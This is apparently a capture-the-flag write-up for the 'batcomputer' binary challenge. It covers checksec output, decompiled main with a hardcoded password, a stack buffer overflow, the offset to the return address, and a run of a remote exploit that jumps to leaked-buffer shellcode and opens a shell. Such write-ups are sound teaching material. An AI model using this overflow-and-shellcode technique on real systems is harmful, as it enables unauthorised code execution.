# batcomputer

Start with some basic file enumeration

```s
$ file batcomputer 
batcomputer: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=497abb33ba7b0370d501f173facc947759aa4e22, for GNU/Linux 3.2.0, stripped
$ pwn checksec batcomputer 
[*] 'batcomputer'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

The only security here is PIE. The application is also stripped so we'll need to identify `main` manually.

After a bit of rummaging, I identified `main`:

```c

undefined8 main(void)

{
  int iVar1;
  int local_68;
  char acStack_64 [16];
  undefined target [76];
  
  none_1();
  while( true ) {
    while( true ) {
      memset(acStack_64,0,16);
      printf(
            "Welcome to your BatComputer, Batman. What would you like to do?\n1. Track Joker\n2. Cha se Joker\n> "
            );
      __isoc99_scanf(&DAT_00102069,&local_68);
      if (local_68 != 1) break;
      printf("It was very hard, but Alfred managed to locate him: %p\n",target);
    }
    if (local_68 != 2) break;
    printf("Ok. Let\'s do this. Enter the password: ");
    __isoc99_scanf(&DAT_001020d0,acStack_64);
    iVar1 = strcmp(acStack_64,"b4tp@$$w0rd!");
    if (iVar1 != 0) {
      puts("The password is wrong.\nI can\'t give you access to the BatMobile!");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    printf("Access Granted. \nEnter the navigation commands: ");
    read(0,target,137);
    puts("Roger that!");
  }
  puts("Too bad, now who\'s gonna save Gotham? Alfred?");
  return 0;
}


```

There is an overflow in `target`. The buffer is only allocated 76 bytes but allows 137 bytes to be read in. First identify the offset for the payload:

```s
gef➤  patter offset $rsp
[+] Searching for '$rsp'
[+] Found at offset 84 (little-endian search) likely
[+] Found at offset 85 (big-endian search) 
gef➤
```

Cool. With the target buffer so far away from the return address, we won't have enough room to inject shellcode. Fortunately, the program leaks the start address of our target buffer off. We'll simply be able to jump back there and execute the shellcode. I'm a script kiddie and stole shellcode from [shell-storm](https://shell-storm.org/shellcode/files/shellcode-806.html)

```s
$ ./exploit.py REMOTE
[+] Opening connection to 188.166.175.0 on port 32567: Done
[*] start of buffer: 0x7ffe91536974
[*] Switching to interactive mode
Too bad, now whos gonna save Gotham? Alfred?
$ ls
batcomputer
core
flag.txt
```